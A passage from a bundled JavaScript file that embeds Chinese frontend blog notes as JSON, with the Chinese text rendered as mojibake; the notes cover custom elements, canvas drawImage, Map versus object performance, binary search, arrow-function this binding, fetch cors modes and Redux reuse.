æ€»æ˜¯ç»§æ‰¿è‡ªHTMLElement</p>\\n</blockquote>\\n</li>\\n<li><p>customElement.get()</p>\\n<p>  è¿”å›æŒ‡å®šè‡ªå®šä¹‰å…ƒç´ çš„æ„é€ å‡½æ•°ï¼Œå¦‚æœæœªå®šä¹‰è‡ªå®šä¹‰å…ƒç´ ï¼Œåˆ™è¿”å›undefinedã€‚</p>\\n</li>\\n<li><p>customElement.whenDefined()</p>\\n<p>  è¿”å›å½“ä½¿ç”¨ç»™å®šåç§°å®šä¹‰è‡ªå®šä¹‰å…ƒç´ æ—¶(å¿…é¡»ä½¿ç”¨æœ‰æ•ˆåç§°)å°†ä¼šæ‰§è¡Œçš„promise(æ— å‚æ•°)ã€‚</p>\\n<blockquote>\\n<p>æœ‰æ•ˆçš„åç§°ï¼š<code>[a-z]xx-xxx</code>\\nå…·ä½“å‚è€ƒ:<a href=\\"https://html.spec.whatwg.org/multipage/custom-elements.html#prod-pcenchar\\">https://html.spec.whatwg.org/multipage/custom-elements.html#prod-pcenchar</a></p>\\n</blockquote>\\n<p>  ä¾‹å­ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>  customElements.whenDefined(&quot;my-ele&quot;).then(()=&gt;{\\n    // æ­¤å¤„æ— å‚æ•°ä¼ é€’\\n    console.log(&quot;defined&quot;)\\n  })\\n  class MyEle extends HTMLElement {\\n    constructor() {\\n      // å¿…é¡»é¦–å…ˆè°ƒç”¨ superæ–¹æ³• \\n      super(); \\n      // å…ƒç´ çš„åŠŸèƒ½ä»£ç å†™åœ¨è¿™é‡Œ\\n    }\\n  }\\n  customElements.define(\'my-ele\', MyEle );</code></pre></code></pre></li>\\n</ul>\\n<h3 id=\\"da-pei-shadow-root-xiao-li-zi\\">æ­é…<code>shadow root</code>å°ä¾‹å­</h3>\\n<pre><code><pre class=\\"hljs\\"><code>class MyEle extends HTMLElement {\\n  constructor() {\\n    super(); \\n    // å¯åŠ¨shadowRoot\\n    var shadow = this.attachShadow({mode: \'open\'});\\n\\n    var wrapper = document.createElement(\'span\');\\n    wrapper.setAttribute(\'class\',\'wrapper\');\\n    const style = document.createElement(\'style\');\\n    style.textContent = `\\n      .wrapper {\\n        background:blue;\\n      }\\n    `\\n    shadow.appendChild(wrapper);\\n  }\\n}\\ncustomElements.define(\'my-ele\', MyEle);</code></pre></code></pre><p>æ­¤å¤„å®šä¹‰äº†ä¸€ä¸ª<code>custom Element</code>ï¼Œ(åŒ…æ‹¬å¯åŠ¨<code>shadowRoot</code>å’Œ<code>define</code>)ï¼Œå…¶å†…éƒ¨çš„<code>.wrapper</code>èƒŒæ™¯æ˜¯è“è‰²ï¼Œä¸å¤–éƒ¨çš„<code>.wrapper</code>ä¸å†²çªã€‚</p>\\n<h2 id=\\"sheng-ming-zhou-qi\\">ç”Ÿå‘½å‘¨æœŸ</h2>\\n<ul>\\n<li>connectedCallbackï¼šå½“<code>custom element</code>é¦–æ¬¡è¢«æ’å…¥æ–‡æ¡£DOMæ—¶ï¼Œè¢«è°ƒç”¨ã€‚</li>\\n<li>disconnectedCallbackï¼šå½“<code>custom element</code>ä»æ–‡æ¡£DOMä¸­åˆ é™¤æ—¶ï¼Œè¢«è°ƒç”¨ã€‚</li>\\n<li>adoptedCallbackï¼šå½“<code>custom element</code>è¢«ç§»åŠ¨åˆ°æ–°çš„æ–‡æ¡£æ—¶ï¼Œè¢«è°ƒç”¨ã€‚</li>\\n<li>attributeChangedCallback:(å¤šæ¬¡è¢«è°ƒç”¨) å½“<code>custom element</code>å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹è‡ªèº«å±æ€§æ—¶ï¼Œè¢«è°ƒç”¨ã€‚</li>\\n</ul>\\n","toc":[{"anchor":"custom-elements","level":3,"text":"custom elements"},{"anchor":"api","level":3,"text":"API"},{"anchor":"da-pei-shadow-root-xiao-li-zi","level":3,"text":"æ­é…<code>shadow root</code>å°ä¾‹å­"},{"anchor":"sheng-ming-zhou-qi","level":2,"text":"ç”Ÿå‘½å‘¨æœŸ"}],"relatedTags":null,"created_at":"2018-12-06","timeArr":[2018,11,6,0,0,0,0],"title":"customElementsç®€è¿°-ç¬”è®°","uuid":"b921517a71d6975276b0a16acc18047667769321","summary":"<h4>custom elements</h4>\\n<p>ä½œç”¨ï¼šå°†HTMLé¡µé¢çš„åŠŸèƒ½å°è£…ä¸º<code>custom elements</code>(è‡ªå®šä¹‰æ ‡ç­¾)</p>\\n<blockquote>\\n<p><code>shadow root</code>ï¼šæ¸²æŸ“éš”ç¦»</p>\\n</blockquote>\\n<h4>API</h4>\\n<ul>\\n<li>\\n<p>customElement.define()</p>\\n<p>å®šä¹‰ä¸€ä¸ªæ–°çš„ è‡ªå®šä¹‰å…ƒç´ ã€‚</p>\\n<p>å‚æ•°1ï¼š<code>name</code>è‡ªå®šä¹‰...</p>\\n</li>\\n</ul>","slug":"customElements-jian-shu-bi-ji","sha":"a05dffbbc1c300934bccf6d802d61ea2a8458807"}')},587:function(n){n.exports=JSON.parse('{"content":"<p>canvasçš„drawImageæ–¹æ³•ç»„å¤šå¯ä»¥æœ‰9ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>void ctx.drawImage(image, dx, dy);\\nvoid ctx.drawImage(image, dx, dy, dWidth, dHeight);\\nvoid ctx.drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight);</code></pre></code></pre><p>ç¬¬ä¸‰ç§ä½¿ç”¨çš„å‚æ•°ç†è§£ï¼š</p>\\n<ul>\\n<li>dxï¼šç”¨äºæ˜¾ç¤ºçš„çª—å£ä½ç½®x</li>\\n<li>dyï¼šç”¨äºæ˜¾ç¤ºçš„çª—å£ä½ç½®y</li>\\n<li>dWidthï¼šç”¨äºæ˜¾ç¤ºçš„çª—å£å®½åº¦</li>\\n<li>dHeightï¼šç”¨äºæ˜¾ç¤ºçš„çª—å£é«˜åº¦</li>\\n<li>sxï¼šç”¨äºæ˜¾ç¤ºçš„ç”»çš„ä½ç½®x</li>\\n<li>syï¼šç”¨äºæ˜¾ç¤ºçš„ç”»çš„ä½ç½®y</li>\\n<li>sWidthï¼šç”¨äºæ˜¾ç¤ºçš„ç”»çš„å®½åº¦</li>\\n<li>sHeightï¼šç”¨äºæ˜¾ç¤ºçš„ç”»çš„é«˜åº¦</li>\\n</ul>\\n<p>å¯ä»¥çœ‹æˆ2å¼ ç”»å¸ƒï¼Œå¤–é¢çš„ä¸€å¼ é€šè¿‡<code>d</code>å‚æ•°å¯¹å…¶å¼€çª—å£\\né‡Œé¢çš„ä¸€å¼ æ˜¯ç”»ï¼Œé€šè¿‡<code>s</code>å‚æ•°å¯¹å…¶è£å‰ª</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p><code>sx=0,sy=0,sw=1,sh=1</code></p>\\n<p>è¯´æ˜ä»<code>[0,0]</code>å¼€å§‹è£å‡äº†<code>1*1</code>çš„å›¾åƒ</p>\\n<p><code>dx=0,dy=0,dw=100,dh=100</code></p>\\n<p>è¯´æ˜ä»<code>[0,0]</code>å¼€å§‹ï¼Œå¼€äº†ä¸€ä¸ª<code>100*100</code>çš„çª—å£</p>\\n<p>æœ€åå°†è£å‰ªçš„å›¾åƒå¡«æ»¡çª—å£ï¼Œä¹Ÿå°±æ˜¯å®½é«˜éƒ½æ”¾å¤§äº†100å€</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-03","timeArr":[2018,8,3,0,0,0,0],"title":"drawImageçš„9ä¸ªå‚æ•°","uuid":"0dd0d60aa80404051e5b01683717fd83676f1c68","summary":"<p>canvasçš„drawImageæ–¹æ³•ç»„å¤šå¯ä»¥æœ‰9ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹ï¼š</p>\\n<pre class=\\"hljs\\"><code>void ctx.drawImage(image, dx, dy);\\nvoid ctx.drawImage(image, dx, dy, dWidth, dHeight);\\nvoid ctx.drawImage(image, sx, sy, sWi...</code></pre>","slug":"drawImage-de-9-ge-can-shu","sha":"9037842d9026af5c37a1ba0eca58e9071b5903e3"}')},588:function(n){n.exports=JSON.parse('{"content":"<p>å¯¹æ¯”äº†mapå’ŒhashTableå¯¹æ•°æ®å­˜å–çš„æ€§èƒ½ï¼Œkeyç±»å‹ä¸ºstring</p>\\n<p>æµ‹è¯•æ–¹æ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// CODESæ˜¯å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„</span>\\n\\n<span class=\\"hljs-comment\\">// map</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n      <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n      <span class=\\"hljs-keyword\\">if</span>(!m.has(i))m.set(i,<span class=\\"hljs-number\\">1</span>)\\n      <span class=\\"hljs-keyword\\">else</span> m.set(i,m.get(i)+<span class=\\"hljs-number\\">1</span>)\\n    }\\n  }\\n\\n<span class=\\"hljs-comment\\">// hashTable {}</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n    <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n    <span class=\\"hljs-keyword\\">if</span>(!c[i])c[i]=<span class=\\"hljs-number\\">1</span>\\n    <span class=\\"hljs-keyword\\">else</span> c[i]++\\n  }\\n}</code></pre></code></pre>\\n<p>æµ‹è¯•ç»“æœ</p>\\n<pre><code><pre class=\\"hljs\\"><code>map:           hashTable:         \\n22,755         7,502          \\nÂ±0.52%         Â±0.65%         \\nfastest        67% slower              </code></pre></code></pre><p>æµ‹è¯•åœ°å€:<a href=\\"https://jsperf.com/hanktest-map-vs-hashtable\\">https://jsperf.com/hanktest-map-vs-hashtable</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-21","timeArr":[2018,7,21,0,0,0,0],"title":"å¯¹æ¯”map,{},[]çš„å­˜å–æ•ˆç‡","uuid":"80cda11f9e18b118723c11b54a629d2ce4a71c79","summary":"<p>å¯¹æ¯”äº†mapå’ŒhashTableå¯¹æ•°æ®å­˜å–çš„æ€§èƒ½ï¼Œkeyç±»å‹ä¸ºstring</p>\\n<p>æµ‹è¯•æ–¹æ³•ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// CODESæ˜¯å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„</span>\\n\\n<span class=\\"hljs-comment\\">// map</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> x=<span class=\\"hljs-number\\">0</span>;x&lt;<span class=\\"hljs-number\\">2</span>;x++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> k=<span class=\\"hljs-number\\">0</span>;k&lt;CODES.length;k++){\\n      <span class=\\"hljs-keyword\\">let</span> i=CODES[k]\\n   ...</code></pre>","slug":"dui-bi-map-{}-[]-de-cun-qu-xiao-lv","sha":"d2b8968488e3098bc8d6a318374cc0b57ab9511d"}')},589:function(n){n.exports=JSON.parse('{"content":"<p>é€šå¸¸äºŒåˆ†æŸ¥æ‰¾ç®—æ³•æ˜¯æ ¹æ®indexè¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶ä¸”è¦æ±‚æ•°æ®ç»“æ„æ˜¯å·²æ’åºçš„ã€‚</p>\\n<p>è¿™é‡Œè®°å½•ä¸€ä¸ªæœªæ’åºçš„äºŒåˆ†æŸ¥æ‰¾</p>\\n<p>é¢˜ç›®ï¼šåœ¨ä¸€ä¸ªæ•°ç»„arrä¸­ï¼Œæ‰¾å‡ºä»å°åˆ°å¤§ç¬¬nä¸ªçš„æ•°å­—</p>\\n<p>ä¾‹å¦‚ï¼š<code>[6,3,8,1,4,7]</code>ï¼Œæ‰¾å‡ºç¬¬3ä½ï¼Œç»“æœæ˜¯4</p>\\n<p>ä½¿ç”¨æ’åºä¹Ÿå¯ä»¥è§£å†³ï¼Œå½“ç©ºé—´æœ‰é™åˆ¶æ—¶ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>O(N*lgN)</code>ï¼Œ<del>ä½†äºŒåˆ†æŸ¥æ‰¾çš„èŒƒå›´æ³•å¯ä»¥æ§åˆ¶åˆ°</del><code>O(N)</code>ï¼ŒäºŒåˆ†ä¹Ÿæ˜¯<code>O(nlgn)</code></p>\\n<p>ä½¿ç”¨<code>å¿«é€Ÿé€‰æ‹©</code>èƒ½è¾¾åˆ°<code>O(n)</code>ï¼Œæœ€å<code>O(n^2)</code>ï¼Œå…·ä½“ä»£ç åœ¨<code>2019-1-18</code></p>\\n<p>æ€è·¯æ˜¯ä¸æ–­ç¼©å°æŸ¥æ‰¾èŒƒå›´ç›´åˆ°èŒƒå›´é•¿åº¦ä¸º1ï¼Œè¿™æ—¶æ‰€åœ¨çš„ä½ç½®å°±æ˜¯å¯¹åº”çš„ä½æ•°</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getSpecificNum</span>(<span class=\\"hljs-params\\">arr,k</span>)</span>{\\n  <span class=\\"hljs-comment\\">// æ‰¾å‡ºæœ€å¤§æœ€å°å€¼</span>\\n  <span class=\\"hljs-keyword\\">let</span> lo=<span class=\\"hljs-literal\\">Infinity</span>,hi=-<span class=\\"hljs-literal\\">Infinity</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(arr[i]&lt;lo)lo=arr[i]\\n    <span class=\\"hljs-keyword\\">if</span>(arr[i]&gt;hi)hi=arr[i]\\n  }\\n  <span class=\\"hljs-comment\\">// ç¼©å°èŒƒå›´</span>\\n  <span class=\\"hljs-keyword\\">while</span>(lo&lt;hi){\\n    <span class=\\"hljs-keyword\\">let</span> mid=<span class=\\"hljs-built_in\\">Math</span>.floor((lo+hi)/<span class=\\"hljs-number\\">2</span>)\\n    <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n      <span class=\\"hljs-keyword\\">if</span>(arr[i]&lt;=mid)count++\\n    }\\n    <span class=\\"hljs-keyword\\">if</span>(count&gt;=k)hi=mid\\n    <span class=\\"hljs-keyword\\">else</span> lo=mid+<span class=\\"hljs-number\\">1</span>\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> lo\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-11","timeArr":[2018,8,11,0,0,0,0],"title":"äºŒåˆ†æŸ¥æ‰¾çš„rangeæ–¹æ³•","uuid":"5ba1422eb5748f36ae6b36980b06e537d336b746","summary":"<p>é€šå¸¸äºŒåˆ†æŸ¥æ‰¾ç®—æ³•æ˜¯æ ¹æ®indexè¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶ä¸”è¦æ±‚æ•°æ®ç»“æ„æ˜¯å·²æ’åºçš„ã€‚</p>\\n<p>è¿™é‡Œè®°å½•ä¸€ä¸ªæœªæ’åºçš„äºŒåˆ†æŸ¥æ‰¾</p>\\n<p>é¢˜ç›®ï¼šåœ¨ä¸€ä¸ªæ•°ç»„arrä¸­ï¼Œæ‰¾å‡ºä»å°åˆ°å¤§ç¬¬nä¸ªçš„æ•°å­—</p>\\n<p>ä¾‹å¦‚ï¼š<code>[6,3,8,1,4,7]</code>ï¼Œæ‰¾å‡ºç¬¬3ä½ï¼Œç»“æœæ˜¯4</p>\\n<p>ä½¿ç”¨æ’åºä¹Ÿå¯ä»¥è§£å†³ï¼Œå½“ç©ºé—´æœ‰é™åˆ¶æ—¶ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯<code>O(N*lgN)</code>ï¼Œ~~ä½†äºŒåˆ†æŸ¥æ‰¾çš„èŒƒå›´æ³•å¯ä»¥æ§...</p>","slug":"er-fen-cha-zhao-de-range-fang-fa","sha":"bcaa51d3db66e9c67d11b14a85afe0fed30faf07"}')},590:function(n){n.exports=JSON.parse('{"content":"<p>ç®­å¤´å‡½æ•°()=&gt;{},æ²¡æœ‰è‡ªå·±çš„thisæŒ‡é’ˆ,thisä¸ºä¸Šä¸€å±‚çš„çš„thisæŒ‡é’ˆ</p>\\n<p>function(){},æœ‰è‡ªå·±çš„thisæŒ‡é’ˆ,thisæŒ‡å‘è°ƒç”¨æ—¶çš„å¯¹è±¡</p>\\n<p>ä¾‹å­ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>a=<span class=\\"hljs-string\\">\\"windowScope\\"</span>\\n<span class=\\"hljs-keyword\\">let</span> obj1={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-comment\\">// å‘ä¸Šæ‰¾ä¸åˆ°thisæŒ‡é’ˆï¼ŒæŒ‡å‘window</span>\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj1:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj2={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>,\\n  <span class=\\"hljs-comment\\">// thisä¸ºè°ƒç”¨æ—¶ç¡®å®šçš„å¯¹è±¡</span>\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj2:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj3 = {\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">3</span>,\\n  <span class=\\"hljs-comment\\">// â‘¡functionæœ‰thisæŒ‡é’ˆ,thisæ˜¯è°ƒç”¨æ—¶ç¡®å®š</span>\\n  <span class=\\"hljs-attr\\">show</span> :<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-comment\\">// â‘ å‘ä¸Šæ‰¾åˆ°functionï¼Œæ²¿ç”¨å®ƒçš„this</span>\\n    setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{ <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj3:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a) }, <span class=\\"hljs-number\\">100</span>);\\n  }\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj4={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">4</span>,\\n  <span class=\\"hljs-comment\\">// â‘¡æ— thisï¼Œç»§ç»­å‘ä¸Šæ‰¾ï¼ŒæŒ‡å‘window</span>\\n  <span class=\\"hljs-attr\\">show</span> :<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{\\n    <span class=\\"hljs-comment\\">// â‘ å‘ä¸Šæ‰¾åˆ°()=&gt;{}</span>\\n    setTimeout(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> { <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj4:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a) }, <span class=\\"hljs-number\\">100</span>);\\n  }\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> obj5={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-attr\\">show</span>:{\\n    <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>,\\n    <span class=\\"hljs-comment\\">// å‘ä¸Šå¹¶æœªèƒ½æ‰¾åˆ°å¸¦æœ‰thisçš„è¯æ³•ä½œç”¨åŸŸï¼Œæœ€ç»ˆæŒ‡å‘window</span>\\n    <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>{<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'obj5:\'</span>,<span class=\\"hljs-keyword\\">this</span>.a)}\\n  }\\n};\\n\\nobj1.show(); <span class=\\"hljs-comment\\">// windowScope</span>\\nobj2.show(); <span class=\\"hljs-comment\\">// 2</span>\\nobj3.show(); <span class=\\"hljs-comment\\">// 3</span>\\nobj4.show(); <span class=\\"hljs-comment\\">// windowScope</span>\\nobj5.show.show() <span class=\\"hljs-comment\\">// windowScope</span></code></pre></code></pre>\\n<p>ç»§ç»­ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> btn=<span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"btn\\"</span>);\\n<span class=\\"hljs-comment\\">// å®šä¹‰çš„æ—¶å€™ï¼Œå‘ä¸Šä¸€å±‚å¯»æ‰¾ï¼ŒæŒ‡å‘window</span>\\nbtn.addEventListener(<span class=\\"hljs-string\\">\'click\'</span>,()=&gt;{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>)\\n})\\n\\ntriggerClick(btn) <span class=\\"hljs-comment\\">// window</span></code></pre></code></pre>\\n<p>ç»“è®ºï¼š</p>\\n<ol>\\n<li>å¯¹è±¡æ–¹æ³•ä¸­è°¨æ…ä½¿ç”¨ç®­å¤´å‡½æ•°</li>\\n<li>å…ƒç´ çš„æ–¹æ³•è°¨æ…ä½¿ç”¨ç®­å¤´å‡½æ•°</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-09","timeArr":[2018,5,9,0,0,0,0],"title":"es6ç®­å¤´å‡½æ•°çš„this","uuid":"9ef13100cd0019709df5ac5974b441155efa3b42","summary":"<p>ç®­å¤´å‡½æ•°()=&gt;{},æ²¡æœ‰è‡ªå·±çš„thisæŒ‡é’ˆ,thisä¸ºä¸Šä¸€å±‚çš„çš„thisæŒ‡é’ˆ</p>\\n<p>function(){},æœ‰è‡ªå·±çš„thisæŒ‡é’ˆ,thisæŒ‡å‘è°ƒç”¨æ—¶çš„å¯¹è±¡</p>\\n<p>ä¾‹å­ï¼š</p>\\n<pre class=\\"hljs\\"><code>a=<span class=\\"hljs-string\\">\\"windowScope\\"</span>\\n<span class=\\"hljs-keyword\\">let</span> obj1={\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>,\\n  <span class=\\"hljs-comment\\">// å‘ä¸Šæ‰¾ä¸åˆ°thisæŒ‡é’ˆï¼ŒæŒ‡å‘window</span>\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span>=&gt;</span>...</code></pre>","slug":"es6-jian-tou-han-shu-de-this","sha":"662ce20e60723f1b990376486a6f12aef2e2935c"}')},591:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"cors-vs-no-cors\\">cors .vs no-cors</h2>\\n<p>åè¯ï¼š</p>\\n<ul>\\n<li><p><code>CORS filtered response</code></p>\\n<blockquote>\\n<p>A CORS filtered response is a filtered response whose type is &quot;cors&quot;, header list excludes any headers in internal responseâ€™s header list whose name is not a CORS-safelisted response-header name, given internal responseâ€™s CORS-exposed header-name list, and trailer is empty.</p>\\n</blockquote>\\n</li>\\n<li><p><code>simple headers.</code></p>\\n<blockquote>\\n<p>A CORS-safelisted request-header is a header whose name is a byte-case-insensitive match for one of</p>\\n<p><code>Accept</code></p>\\n<p><code>Accept-Language</code></p>\\n<p><code>Content-Language</code></p>\\n<p><code>Content-Type</code> and whose value, once extracted, has a MIME type (ignoring parameters) that is <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code></p>\\n</blockquote>\\n</li>\\n<li><p><code>opaque filtered response</code></p>\\n<blockquote>\\n<p>An opaque filtered response is a filtered response whose type is &quot;opaque&quot;, url list is the empty list, status is 0, status message is the empty byte sequence, header list is empty, body is null, and trailer is empty.</p>\\n</blockquote>\\n</li>\\n</ul>\\n<hr>\\n<ul>\\n<li>cors</li>\\n</ul>\\n<p>è®¾ç½®<code>cors</code>è·¨åŸŸè·å–èµ„æºä¼šæç¤ºæŠ¥é”™ï¼Œå› ä¸º<code>cors</code>æ˜¯è·¨åŸŸè®¿é—®æ§åˆ¶ï¼Œéœ€è¦å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åŒæ—¶æ”¯æŒï¼Œ\\nå®¢æˆ·ç«¯ä¸èƒ½è®¾ç½®ä¸º<code>same-origin</code>ï¼ŒæœåŠ¡ç«¯è¦è®¾ç½®<code>Access-Control-Allow-Origin</code>ã€‚</p>\\n<p>å½“æœåŠ¡ç«¯æœªè®¾ç½®<code>Access-Control-Allow-Origin</code>çš„æ—¶å€™ï¼Œ</p>\\n<ul>\\n<li>no-cors</li>\\n</ul>\\n<p>è®¾ç½®<code>no-cors</code>ä¸ä¼šæŠ¥é”™ï¼Œèƒ½è¿”å›<code>ç®€å•æ•°æ®</code>ä½†ä¸èƒ½è¯»å–ï¼Œå› ä¸º<code>no-cors</code>åªèƒ½ç”¨äº<code>simple-header</code>ï¼Œ\\nè€Œä¸”è¿”å›çš„æ˜¯ä¸€ä¸ª<code>opaque filtered response</code></p>\\n<p><code>no-cors</code>ä¸€èˆ¬ç”¨äºç¼“å­˜é™æ€èµ„æºï¼Œè€Œä¸èƒ½ç”¨äºè§£ææ•°æ®</p>\\n<p><a href=\\"https://stackoverflow.com/questions/36292537/what-is-an-opaque-response-and-what-purpose-does-it-serve\\">nice answer</a></p>\\n<blockquote>\\n<p>Consider the case in which a service worker acts as an agnostic cache. Your only goal is serve the same resources you would get from network but faster. Of course you can&#39;t ensure all the resources will be part of your origin (consider libraries served from CDNs, for instance). As the service worker has the potential of altering network responses, you need to guarantee you are not interested on the contents of the response, nor on its headers, nor even on the result. You&#39;re only interested on the response as a black box to possibly cache it and serve it faster.</p>\\n<p>This is why { mode: &#39;no-cors&#39; } was made for.</p>\\n</blockquote>\\n","toc":[{"anchor":"cors-vs-no-cors","level":2,"text":"cors .vs no-cors"}],"relatedTags":null,"created_at":"2018-07-12","timeArr":[2018,6,12,0,0,0,0],"title":"fetch-corsVSno-cors","uuid":"26780522dc2b9dd466ebe91331b58247e5f73627","summary":"<p>A CORS filtered response is a filtered response whose type is &quot;cors&quot;, header list excludes any headers in internal responseâ€™s header list whose name is not a CORS-safelisted response-header name, given internal responseâ€™s CORS-exposed header-name list, and trailer is empty.</p>","slug":"fetch-corsVSno-cors","sha":"17a85d07a1ae45e6a8f6857bf3c621bfba2bd674"}')},592:function(n){n.exports=JSON.parse('{"content":"<p>###3 Reduxçš„å¤ç”¨</p>\\n<p>å› ä¸ºæ¯ä¸€æ¬¡dispatchéƒ½æ˜¯éå†æ‰€æœ‰reducerå¯»æ‰¾typeï¼Œå› æ­¤æ¯ä¸€ä¸ªactionçš„typeä¸èƒ½ä¸€è‡´ï¼Œ\\nå½“éœ€è¦å¤ç”¨reduceræ—¶ï¼Œå¯ä»¥ä½¿ç”¨prefix</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">generateReducer</span>(<span class=\\"hljs-params\\">prefix,state</span>)</span>{\\n  <span class=\\"hljs-keyword\\">const</span> SOMETYPE=prefix+<span class=\\"hljs-string\\">\'SOMETYPE\'</span>;\\n  <span class=\\"hljs-keyword\\">const</span> initialState={...state}\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state=initialState,action</span>)</span>{\\n    <span class=\\"hljs-comment\\">//...</span>\\n  }\\n}</code></pre></code></pre>\\n<p>###3 Reduxçš„å¢å¼º</p>\\n<p>å¢å¼ºreduxé€šè¿‡3ç‚¹è¿›è¡Œ</p>\\n<ul>\\n<li>å¤„ç†é¢å¤–çš„action</li>\\n<li>ç»´æŠ¤æ›´å¤šstate</li>\\n<li>actionèƒ½ä¼ é€’ç»™åŸå§‹reducerå¤„ç†</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">HOCReducer</span>(<span class=\\"hljs-params\\">reducer</span>)</span>{\\n  <span class=\\"hljs-comment\\">// æ­¤å¤„å¯ä»¥é…ç½®æ›´å¤šstate</span>\\n 